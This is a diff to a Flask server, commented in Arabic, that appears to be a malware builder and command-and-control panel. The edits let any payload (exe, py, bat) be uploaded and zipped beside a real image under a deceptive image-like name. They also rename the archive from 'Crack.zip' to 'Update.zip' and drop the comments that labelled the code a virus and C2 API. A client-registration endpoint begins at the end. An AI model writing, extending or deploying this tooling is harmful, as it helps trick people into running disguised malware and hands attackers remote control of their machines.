@@ -10,32 +10,33 @@ app = Flask(__name__)
 
 # تخزين في الذاكرة
 clients = {}
-UPLOADED_EXE_DATA = None
+UPLOADED_PAYLOAD_DATA = None
+PAYLOAD_EXTENSION = ".exe" # افتراضي
 lock = threading.Lock()
 
-# عرض صفحة التحكم (HTML)
 @app.route('/')
 def index():
     return send_from_directory('.', 'index.html')
 
-# رفع ملف الفايروس (client.exe)
-@app.route('/upload_exe', methods=['POST'])
-def upload_exe():
-    global UPLOADED_EXE_DATA
+@app.route('/upload_payload', methods=['POST'])
+def upload_payload():
+    global UPLOADED_PAYLOAD_DATA, PAYLOAD_EXTENSION
     if 'file' not in request.files:
         return jsonify({"ok": False, "error": "No file"})
     file = request.files['file']
     if file.filename == '':
         return jsonify({"ok": False, "error": "Empty filename"})
-    UPLOADED_EXE_DATA = file.read()
+    
+    # حفظ الملف سواء كان exe أو py أو bat
+    UPLOADED_PAYLOAD_DATA = file.read()
+    PAYLOAD_EXTENSION = os.path.splitext(file.filename)[1]
     return jsonify({"ok": True})
 
-# دمج الصورة مع الفايروس وصنع ZIP
 @app.route('/build', methods=['POST'])
 def build():
-    global UPLOADED_EXE_DATA
-    if not UPLOADED_EXE_DATA:
-        return "Please upload client.exe first", 400
+    global UPLOADED_PAYLOAD_DATA, PAYLOAD_EXTENSION
+    if not UPLOADED_PAYLOAD_DATA:
+        return "Please upload the payload first", 400
     
     if 'image' not in request.files:
         return "No image uploaded", 400
@@ -43,17 +44,24 @@ def build():
     img = request.files['image']
     img_name = img.filename
     
+    # اسم الملف الخادع
+    custom_name = request.form.get('custom_name', '').strip()
+    if not custom_name:
+        custom_name = f"{img_name}{PAYLOAD_EXTENSION}"
+    elif not custom_name.endswith(PAYLOAD_EXTENSION):
+        custom_name += PAYLOAD_EXTENSION
+    
     memory_file = io.BytesIO()
     with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
         # 1. الصورة الحقيقية
         zf.writestr(f"IMG_{img_name}", img.read())
-        # 2. الفايروس متنكر باسم صورة
-        zf.writestr(f"{img_name}.exe", UPLOADED_EXE_DATA)
+        # 2. الفايروس بالاسم المخصص
+        zf.writestr(custom_name, UPLOADED_PAYLOAD_DATA)
             
     memory_file.seek(0)
-    return send_file(memory_file, mimetype='application/zip', as_attachment=True, download_name='Crack.zip')
+    return send_file(memory_file, mimetype='application/zip', as_attachment=True, download_name='Update.zip')
 
-# --- مسارات التحكم (C2 API) ---
+# --- مسارات التحكم ---
 @app.route('/api/register', methods=['POST'])
 def register():
     data = request.json
